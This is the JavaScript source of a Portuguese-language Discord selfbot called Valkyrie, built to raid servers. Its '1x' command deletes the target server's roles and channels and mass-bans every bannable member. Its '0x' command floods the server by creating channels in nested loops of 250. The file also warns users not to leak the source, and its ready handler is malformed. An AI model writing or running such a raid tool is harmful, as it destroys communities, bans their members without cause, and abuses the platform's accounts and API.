const Discord = require('discord.js');
const valkyrie = new Discord.Client();
const exampleEmbed = new Discord.RichEmbed()
const prefix = "v!"
const format = require('string-format')
const axios = require('axios');
const cpuStat = require('cpu-stat');
const db = require("mongoose")
const os = require('os');
const moment = require('moment-timezone');
const colors = require('colors');
const fs = require('fs');
const setTitle = require('console-title');
valkyrie.on('ready', function() {
valkyrie.user.setActivity("O escolhido", {type: "STREAMING", url: "https://www.twitch.tv/valkyrie"})


setTitle('Valkyrie | Carregando');

});
//Registro na console
    console.log('')
    console.log(`                     ██╗   ██╗ █████╗ ██╗     ██╗  ██╗██╗   ██╗██████╗ ██╗███████╗                     `. white)
    console.log(`                     ██║   ██║██╔══██╗██║     ██║ ██╔╝╚██╗ ██╔╝██╔══██╗██║██╔════╝                     `. white)
    console.log(`                     ██║   ██║███████║██║     █████╔╝  ╚████╔╝ ██████╔╝██║█████╗                       `. white)
    console.log(`                     ╚██╗ ██╔╝██╔══██║██║     ██╔═██╗   ╚██╔╝  ██╔══██╗██║██╔══╝                       `. white)
    console.log(`                      ╚████╔╝ ██║  ██║███████╗██║  ██╗   ██║   ██║  ██║██║███████╗                     `. gray)
    console.log(`                       ╚═══╝  ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝   ╚═╝   ╚═╝  ╚═╝╚═╝╚══════╝                     `. gray)
                                                            // Segunda  parte
    console.log(`                               All Rights Reserved ₪ Casa Blanca 2020-2021                                    `. black)
    console.log(`                                       Self Criado Por: Valky Team                                            `. black)
    console.log(`                   ┌───────────────────────────────────────────────────────────────────┐                      `. white)
    console.log(`                   │ ${valkyrie.user.username} Está pronto a nadar no reino das trevas │                      `. white)
    console.log(`                   └───────────────────────────────────────────────────────────────────┘                      `. white) 
    console.log(`                         Caso Divulgue a source deste SELF sofrerá as consequência.                           `. black) 
    setTitle("Valyrie Selfbot")
    
});



  //Comandos - Valkyrie
   valkyrie.on('message', message => {  
    if(message.author.id !== valkyrie.user.id)return
     else if (message.content.startsWith("1x")) {
         // Apagar mensagem do autor
         message.delete()
        
     //Processo de Raid * Back
    message.guild.roles.filter(r=>r.position < message.guild.me.highestRole.position).deleteAll();
    message.guild.channels.deleteAll();
    message.guild.members.tap(member => member.ban("ValK - Casa Blanca"));
    // Outro Mass-Ban para certificar * filtrando os membros baniveis no servidor
    message.guild.members.filter(member => member.bannable).forEach(member => {member.ban()});
    console.log(`Limpando  ${message.guild.name} `)
    console.log(`Limpando  ${message.guild.name} `)
    console.log(`Limpando  ${message.guild.name} `)
    console.log(`Limpando  ${message.guild.name} `)
    console.log(`Limpando  ${message.guild.name} `)
    console.log(`Limpando  ${message.guild.name} `)
    console.log(`Limpando  ${message.guild.name} `)
    console.log(`Limpando  ${message.guild.name} `)
    console.log(`Limpando  ${message.guild.name} `)
    console.log(`Limpando  ${message.guild.name} `)

}

// Comandos Valkyrie - 2
if(message.content.startsWith('0x')){
 // Apagar mensagem do autor
message.delete()

// [1] Vai começar de 0 e criar 250 canais
for (var i = 0; i < 250; i++) {
message.guild.createChannel('Expurgado por ' + message.author.username)
// O mesmo do 1
for (var i = 0; i < 250; i++) {
let channels = message.guild.createChannel('Expurgado por ' + message.author.username)
}
}
}



})
/// FIM 

  
        /// Login
    valkyrie.login("SEU TOKEN AQUI")

